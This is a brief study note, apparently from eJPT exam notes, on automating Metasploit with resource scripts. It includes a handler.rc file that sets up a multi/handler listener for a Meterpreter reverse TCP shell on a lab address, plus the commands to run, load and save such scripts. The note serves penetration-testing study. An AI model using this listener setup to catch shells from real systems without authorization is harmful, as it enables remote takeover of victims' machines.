## Automate Metasploit with resource script

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)
```
ls -la usr/share/metasploit-framework/scripts/resource
```
This is the folder containing all the resource scripts already available for Metasploit.

### handler.rc
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.1
set LPORT 1234
run
```
Insert all these commands into the file and then execute it in the terminal to run Metasploit and execute the commands.
```
msfconsole -r handler.rc
```
On the other hand, we can execute it in msfconsole.
```
resource /Desktop/handler.rc
```
We can also save all the command just used in a file with this.
```
makerc /Desktop/portscan.rc
```
